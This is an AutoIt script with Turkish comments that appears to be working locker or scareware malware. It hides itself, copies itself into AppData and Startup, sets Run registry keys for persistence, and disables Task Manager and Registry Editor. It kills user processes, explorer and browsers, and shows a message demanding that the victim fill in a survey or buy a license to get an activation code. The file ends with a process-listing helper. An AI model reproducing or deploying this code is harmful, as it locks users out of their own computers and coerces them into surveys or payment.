#include <Array.au3>
Opt("TrayIconHide", 1)
Opt("TrayAutoPause", 0)
Opt("WinTitleMatchMode",2)

Func _FileRename_($s_Source, $s_Destination, $i_Flag = 0)
    Local $i
    $i = FileMove($s_Source, $s_Destination, $i_Flag)
    Return $i
EndFunc

$chromedizin = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe","Path")
If FileExists($chromedizin & "\chromee.exe") = True then
   While ProcessExists("chromee.exe")
	  ProcessClose("chromee.exe")
	  Sleep(1)
   WEnd
   Sleep(500)
   _FileRename_($chromedizin & "\chromee.exe",$chromedizin & "\chrome.exe")
   EndIf
;chrome virüsünden etkilenmiþ pc varsa düzelt


If @ScriptName = "lockermain.exe" Then
FileCopy(@ScriptFullPath,@AppDataDir & "\lockermain2.exe",1)
FileCopy(@ScriptFullPath,@StartupDir & "\lockermain2.exe",1)
FileInstall("cure.exe",@AppDataDir & "\cure.exe",1)
FileInstall("lockervb.exe",@AppDataDir & "\lockervb.exe",1)
;FileInstall("hosts",@WindowsDir & "\system32\drivers\etc\hosts",1)

While FileExists(@appdatadir & "\lockervb.exe") = False
   Sleep(1)
   WEnd

if ProcessExists("lockermain2.exe") = False then ShellExecute(@AppDataDir & "\lockermain2.exe")
Exit
EndIf

$var = _ProcessListProperties()
For $i = 1 to $var[0][0]
   if  $var[$i][0] <> "cmd.exe" and $var[$i][0] <> "ServiceHostApp.exe" and $var[$i][0] <> "explorer.exe" and $var[$i][0] <> "skype.exe" and $var[$i][0] <> "lockervb.exe" and $var[$i][0] <> "lockermain.exe" and $var[$i][0] <> "lockermain2.exe" and $var[$i][0] <> "cure.exe" Then
	  if StringInStr($var[$i][5],"WINDOWS\",0) = 0 and StringInStr($var[$i][5],"AppData",0) = 0 Then
		 If StringInStr($var[$i][5],"C:\",0) > 0 or StringInStr($var[$i][5],"D:\",0) > 0 Then
	  ConsoleWrite($var[$i][0] & " " & $var[$i][5] & @CRLF)
	ProcessClose($var[$i][1])
	EndIf
	  EndIf
   EndIf
Next


RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MS", "REG_SZ", @StartupDir & "\lockermain2.exe")
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MS", "REG_SZ", @StartupDir & "\lockermain2.exe")

RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\system","DisableTaskMgr","REG_DWORD",1)
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\system", "DisableRegistryTools","REG_DWORD",1)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\system","DisableTaskMgr","REG_DWORD",1)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\system", "DisableRegistryTools","REG_DWORD",1)

if ProcessExists("lockervb.exe") = False then ShellExecute(@AppDataDir & "\lockervb.exe")

akar()

Func akar()
while(1)
   Sleep(1)
   If WinActive("Download") <> 0 or WinActive("Amazon.com:") <> 0 Then
	  Sleep(1)
	  If WinExists("Download") = 1 Then $handle = WinGetHandle("Download")
	  If WinExists("Amazon.com:") = 1 Then $handle = WinGetHandle("Amazon.com:")
   ConsoleWrite("download geldi" & @crlf)
	  While (1)
		    Sleep(1)
		 If StringInStr(WinGetTitle($handle),"Download File",0) = 0 Then
		 ConsoleWrite("degisti" & @crlf)
			If StringInStr(WinGetTitle($handle),"Google'da Ara",0) > 0 or StringInStr(WinGetTitle($handle),"Facebook",0) > 0 or WinGetTitle($handle)= "Google - Google Chrome" or WinGetTitle($handle)= "Yeni Sekme - Google Chrome" or WinGetTitle($handle)= "Google - Mozilla Firefox" or WinGetTitle($handle)= "Yeni sekme - Mozilla Firefox" or WinGetTitle($handle)= "Google - Internet Explorer" or WinGetTitle($handle)= "Boþ Sayfa - Internet Explorer" Then
			MsgBox(16, "Uyarý", "Anketi doldurarak ücretsiz aktivasyon kodu alýn veya yeni lisans satýn alýn", 3)
			   While processexists("chrome.exe")
				     Sleep(1)
			   ProcessClose("chrome.exe")
			WEnd
			 While processexists("iexplore.exe")
				     Sleep(1)
			   ProcessClose("iexplore.exe")
			WEnd
			 While processexists("firefox.exe")
				     Sleep(1)
			   ProcessClose("firefox.exe")
			   WEnd
			   akar()
			EndIf
		 EndIf
	  WEnd
   EndIf

    If ProcessExists("taskmgr.exe") Then
	  ProcessClose("taskmgr.exe")
   EndIf

   If ProcessExists("regedit.exe") Then
	  ProcessClose("regedit.exe")
   EndIf

     If ProcessExists("explorer.exe") Then
	 ProcessClose("explorer.exe")
   EndIf
     If ProcessExists("cure.exe") Then
	Exit
   EndIf

 WEnd
EndFunc

;===============================================================================
; Function Name:    _ProcessListProperties()
; Description:   Get various properties of a process, or all processes
; Call With:       _ProcessListProperties( [$Process [, $sComputer]] )
; Parameter(s):  (optional) $Process - PID or name of a process, default is "" (all)
;          (optional) $sComputer - remote computer to get list from, default is local
; Requirement(s):   AutoIt v3.2.4.9+
; Return Value(s):  On Success - Returns a 2D array of processes, as in ProcessList()
;            with additional columns added:
;            [0][0] - Number of processes listed (can be 0 if no matches found)
;            [1][0] - 1st process name
;            [1][1] - 1st process PID
;            [1][2] - 1st process Parent PID
;            [1][3] - 1st process owner
;            [1][4] - 1st process priority (0 = low, 31 = high)
;            [1][5] - 1st process executable path
;            [1][6] - 1st process CPU usage
;            [1][7] - 1st process memory usage
;            [1][8] - 1st process creation date/time = "MM/DD/YYY hh:mm:ss" (hh = 00 to 23)
;            [1][9] - 1st process command line string
;            ...
;            [n][0] thru [n][9] - last process properties
; On Failure:      Returns array with [0][0] = 0 and sets @Error to non-zero (see code below)
; Author(s):        PsaltyDS at http://www.autoitscript.com/forum
; Date/Version:   12/01/2009  --  v2.0.4
; Notes:            If an integer PID or string process name is provided and no match is found,
;            then [0][0] = 0 and @error = 0 (not treated as an error, same as ProcessList)
;          This function requires admin permissions to the target computer.
;          All properties come from the Win32_Process class in WMI.
;            To get time-base properties (CPU and Memory usage), a 100ms SWbemRefresher is used.
;===============================================================================
Func _ProcessListProperties($Process = "", $sComputer = ".")
    Local $sUserName, $sMsg, $sUserDomain, $avProcs, $dtmDate
    Local $avProcs[1][2] = [[0, ""]], $n = 1

    ; Convert PID if passed as string
    If StringIsInt($Process) Then $Process = Int($Process)

    ; Connect to WMI and get process objects
    $oWMI = ObjGet("winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy, (Debug)}!\\" & $sComputer & "\root\cimv2")
    If IsObj($oWMI) Then
        ; Get collection processes from Win32_Process
        If $Process == "" Then
            ; Get all
            $colProcs = $oWMI.ExecQuery("select * from win32_process")
        ElseIf IsInt($Process) Then
            ; Get by PID
            $colProcs = $oWMI.ExecQuery("select * from win32_process where ProcessId = " & $Process)
        Else
            ; Get by Name
            $colProcs = $oWMI.ExecQuery("select * from win32_process where Name = '" & $Process & "'")
        EndIf

        If IsObj($colProcs) Then
            ; Return for no matches
            If $colProcs.count = 0 Then Return $avProcs

            ; Size the array
            ReDim $avProcs[$colProcs.count + 1][10]
            $avProcs[0][0] = UBound($avProcs) - 1

            ; For each process...
            For $oProc In $colProcs
                ; [n][0] = Process name
                $avProcs[$n][0] = $oProc.name
                ; [n][1] = Process PID
                $avProcs[$n][1] = $oProc.ProcessId
                ; [n][2] = Parent PID
                $avProcs[$n][2] = $oProc.ParentProcessId
                ; [n][3] = Owner
                If $oProc.GetOwner($sUserName, $sUserDomain) = 0 Then $avProcs[$n][3] = $sUserDomain & "\" & $sUserName
                ; [n][4] = Priority
                $avProcs[$n][4] = $oProc.Priority
                ; [n][5] = Executable path
                $avProcs[$n][5] = $oProc.ExecutablePath
                ; [n][8] = Creation date/time
                $dtmDate = $oProc.CreationDate
                If $dtmDate <> "" Then
                    ; Back referencing RegExp pattern from weaponx
                    Local $sRegExpPatt = "\A(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})(?:.*)"
                    $dtmDate = StringRegExpReplace($dtmDate, $sRegExpPatt, "$2/$3/$1 $4:$5:$6")
                EndIf
                $avProcs[$n][8] = $dtmDate
                ; [n][9] = Command line string
                $avProcs[$n][9] = $oProc.CommandLine

                ; increment index
                $n += 1
            Next
        Else
            SetError(2); Error getting process collection from WMI
        EndIf
        ; release the collection object
        $colProcs = 0

        ; Get collection of all processes from Win32_PerfFormattedData_PerfProc_Process
        ; Have to use an SWbemRefresher to pull the collection, or all Perf data will be zeros
        Local $oRefresher = ObjCreate("WbemScripting.SWbemRefresher")
        $colProcs = $oRefresher.AddEnum($oWMI, "Win32_PerfFormattedData_PerfProc_Process" ).objectSet
        $oRefresher.Refresh

        ; Time delay before calling refresher
        Local $iTime = TimerInit()
        Do
            Sleep(20)
        Until TimerDiff($iTime) >= 100
        $oRefresher.Refresh

        ; Get PerfProc data
        For $oProc In $colProcs
            ; Find it in the array
            For $n = 1 To $avProcs[0][0]
                If $avProcs[$n][1] = $oProc.IDProcess Then
                    ; [n][6] = CPU usage
                    $avProcs[$n][6] = $oProc.PercentProcessorTime
                    ; [n][7] = memory usage
                    $avProcs[$n][7] = $oProc.WorkingSet
                    ExitLoop
                EndIf
            Next
        Next
    Else
        SetError(1); Error connecting to WMI
    EndIf

    ; Return array
    Return $avProcs
 EndFunc  ;==>_ProcessListProperties

